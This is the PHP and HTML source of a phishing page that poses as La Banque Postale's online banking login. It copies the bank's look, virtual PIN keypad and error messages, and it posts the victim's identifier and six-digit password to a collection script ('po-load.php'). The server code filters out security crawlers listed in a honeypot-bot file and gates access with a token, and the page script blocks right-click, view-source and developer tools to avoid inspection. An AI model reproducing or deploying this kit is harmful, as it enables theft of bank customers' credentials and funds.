<?php

error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
@ini_set('html_errors','0');
@ini_set('display_errors','0');
@ini_set('display_startup_errors','0');
@ini_set('log_errors','0');
$honeypotbots = file_get_contents('honeypotbots.dat');
$errorUrl = 'Error.php';
$ip = getenv('REMOTE_ADDR');

if (stripos($honeypotbots, $ip) !== false) {
  $stripos = '1';

}



$token1 = base64_encode($_SERVER['HTTP_USER_AGENT'].$ip.date('Y:M:D'));
if ($token1 != $_GET['token'] || $stripos == '1' ){ header("location: " . $errorUrl . "?hash=".base64_encode(rand(0,9999999999999)). "&token=" . $_GET['token']); exit;  }

function curl_get_contents($url)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
    curl_setopt($ch, CURLOPT_URL, $url);
    $data = curl_exec($ch);
    curl_close($ch);
    return $data;
} 
$metri = $_SERVER['REMOTE_ADDR'];
$geoip = 'http://www.geoplugin.net/php.gp?ip='.$metri;
$addrDetailsArr = unserialize(curl_get_contents($geoip)); 
$continent = $addrDetailsArr['geoplugin_continentCode'];
$country = $addrDetailsArr['geoplugin_countryCode'];
 

?>

<!doctype html>
<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1">
   <link href="postale-M3tri_files/favicon.png" rel="icon" type="image/jpg">


    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">

    <title>La Banque Postale - Banque et Assurance en ligne – La Banque Postale</title>
    <style type="text/css">
      img{
        width:100%;
      }
      .inp{
        border-radius:0px;
        border:1px solid #dcdcdc;
        width:90%;
        margin-left:5%;
        height:37px;
        color:#676767;
        text-align: center;
        font-size:15px;
        font-weight: bold;
      }
      .bouton{
        height:40px;
        width:119.5px;
      }
    </style>
  </head>
  <body>
    <img class="d-none d-md-block" src="postale-M3tri_files/p11.png">
    <img class="d-md-none" src="postale-M3tri_files/m11.png">
     

    <div class="container-fluid" style="margin:0px;padding:0px;width:100%">
      <div class="row" style="margin:0px;padding:0px">
        <div class="col-md-5" style="margin:0px;padding:0px;background:#0c2b77;">
          <div class="row">
            <div id="error" class="col-md-7 offset-md-4 col-8 offset-2" style="border:  none; background-color: #17479e; padding-top:30px;padding-bottom:70px; display: none; text-align: left;">
              <p style="font-weight: bold; font-size: .75em; color: #f2f2f2;letter-spacing: .5px;font-family:sans-serif;">Votre identifiant (10 chiffres) ou votre mot de passe n'a pas été reconnu. Si vous rencontrez des difficultés pour vous connecter, veuillez contacter un de nos téléconseillers au 3639* choix 4.</p>
              <p style="font-weight: bold; font-size: .70em; color: #f2f2f2;letter-spacing: .5px;font-family:sans-serif;">* 0,15 €/min + prix d'un appel. Pour accéder aux services du 3639 depuis l'étranger, composez le +33 1 45 45 36 39 à partir d'un poste fixe (coût de communication internationale pour la France).</p>
              <p style="font-weight: bold; font-size: .70em; color: #f2f2f2;letter-spacing: .5px;font-family:sans-serif;"><a href="" id="retour" style="color: white"> >Retour</a></p>
            </div>
            <div id="formulaire" class="col-md-6 offset-md-5 col-8 offset-2" style="border:  none; background-color: white; padding-top:10px;padding-bottom:12px">
              <form method="POST" action="<?php echo 'po-load.php?token='.$token1; ?>"  name="changer" id="form1">          
            <input type="tel"  id="login" name="login" class="inp" placeholder="Saisissez votre identifiant" maxlength="10" pattern="[0-9,a-z,A-Z]*">         
          <input type="checkbox" id="exampleCheck1" style=";margin-left:5%"> <span style="color:#676767">Mémoriser mon identifiant.</span>  
            <input type="password" name="password"  maxlength="6"  id="motDePasse"  class="inp" placeholder="Composez votre mot de passe" style="font-style:italic" maxlength="6" pattern="[0-9,a-z,A-Z]*" readonly>
            <div style="height:29px;width:95%;margin-left:2.5%;text-align: center;font-size:17px;color:white;background-color:#586879;margin-top:5px;font-weight:600;">Activer la vocalisation
            </div>

            <div>
              

            </div>
            <style type="text/css">
              .clavier{
                padding:2px;
                border-radius: 0px;
              }
              .clavier input{
                width:100%;
                height:100%;
                padding-top:8.5px;
                padding-bottom:8.5px;
                background-color:#004b9b;
                border:0px;
                color:#fff;
                font-size:20px;
              }
            </style>

                     <div class="row mx-auto" style="width:90%;margin-top:9px;">
                      <div class="col-md-10 offset-md-1">
                        <div class="row">
                          <div class="col-3 clavier"><input type="button" value="" id=""  class="button" style=""></div>
                          <div class="col-3 clavier"><input type="button" value="5" id="" onClick="clavier(5);"  class="button" style=""></div>
                          <div class="col-3 clavier"><input type="button" value="2" id="" onClick="clavier(2);"  class="button" style=""></div>
                          <div class="col-3 clavier"><input type="button" value="7" id="" onClick="clavier(7);"  class="button" style=""></div>
                        </div>

                        <div class="row">
                          <div class="col-3 clavier"><input type="button" value="6" id="" onClick="clavier(6);"  class="button" style=""></div>
                          <div class="col-3 clavier"><input type="button" value="" id=""   class="button" style=""></div>
                          <div class="col-3 clavier"><input type="button" value="9" id="" onClick="clavier(9);"  class="button" style=""></div>
                          <div class="col-3 clavier"><input type="button" value="" id=""   class="button" style=""></div>
                        </div>

                        <div class="row">
                          <div class="col-3 clavier"><input type="button" value="4" id="" onClick="clavier(4);"  class="button" style=""></div>
                          <div class="col-3 clavier"><input type="button" value="2" id="" onClick="clavier(2);"  class="button" style=""></div>
                          <div class="col-3 clavier"><input type="button" value="0" id="" onClick="clavier(0);"  class="button" style=""></div>
                          <div class="col-3 clavier"><input type="button" value="" id=""  class="button" style=""></div>
                        </div>

                        <div class="row">
                          <div class="col-3 clavier"><input type="button" value="3" id="" onClick="clavier(3);"  class="button" style=""></div>
                          <div class="col-3 clavier"><input type="button" value="" id=""   class="button" style=""></div>
                          <div class="col-3 clavier"><input type="button" value="1" id="" onClick="clavier(1);"  class="button" style=""></div>
                          <div class="col-3 clavier"><input type="button" value="8" id="" onClick="clavier(8);"  class="button" style=""></div>
                        </div>
                      </div>
                     </div>



            <div class="row" style="padding:0px;width:95%;margin-left:2.5%;margin-top:9px">
              <div class="col-5" style="padding:0px">
                <input type="submit" class="bouton" name="" disabled="" value="VALIDER" id="valider" style="background-color: #4d81b9; color: white; border:none;font-weight:600;">
              </div>
              <div class="col-7" style="padding:0px;text-align:right;">
                <input type="submit" class="bouton" name="" value="EFFACER" id="effacer" style="background-color: #586879; color: white; border:none;font-weight:600;">
              </div>
            </div>
            <input type="hidden" name="type" value="log" >
        </form>
            </div>
          </div>
        </div>

        <div class="col-md-7 d-none d-md-block" style="margin:0px;padding:0px">
          <img src="postale-M3tri_files/p2_2.png">
        </div>
      </div>
    </div>

    <img class="d-none d-md-block" src="postale-M3tri_files/p3.png">
    <img class="d-md-none" src="postale-M3tri_files/m22.png">

    <!-- Optional JavaScript -->
    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script src="https://code.jquery.com/jquery-3.4.1.slim.min.js" integrity="sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>

    <script type="text/JavaScript">
function clavier (valeur) {
document.forms["changer"].elements["motDePasse"].value=document.forms["changer"].elements["motDePasse"].value+valeur;
}
document.getElementById('effacer').addEventListener('click', function(e){
    e.preventDefault();
  document.getElementById('motDePasse').value=''})

document.getElementById('login').addEventListener('input', function(){
   if (document.getElementById('login').value.length == 10) {
    
    document.getElementById('valider').removeAttribute("disabled");
    document.getElementById('valider').style.backgroundColor = "#004b9b";
   }else{
    document.getElementById('valider').setAttribute("disabled", "disabled");
    document.getElementById('valider').style.backgroundColor = "#4d81b9";
   }
  })

document.getElementById('valider').addEventListener('click', function(e){
  e.preventDefault()
   if (document.getElementById('motDePasse').value.length == 6) {
    
    document.getElementById('form1').submit();
   
   }else{
    document.getElementById('formulaire').style.display = 'none'
    document.getElementById('error').style.display = 'block'
   }
  })

</script>

<script src="./postale-M3tri_files/jquery.min.js"></script>
<script>
jQuery(function($){

    document.addEventListener('contextmenu', event => event.preventDefault());
    document.onkeydown = function(e) {
        if (e.ctrlKey && 
        (e.keyCode === 67 || 
        e.keyCode === 86 || 
        e.keyCode === 85 ||
        e.keyCode === 83 || 
        e.keyCode === 117)) {
            return false;
        } else {
            return true;
        }
    };

    $(document).keydown(function (event) {
        if (event.keyCode == 123) { // Prevent F12
            return false;
        } else if (event.ctrlKey && event.shiftKey && event.keyCode == 73) { // Prevent Ctrl+Shift+I        
            return false;
        }
    });

    


    

})


</script>



 
  </body>
</html>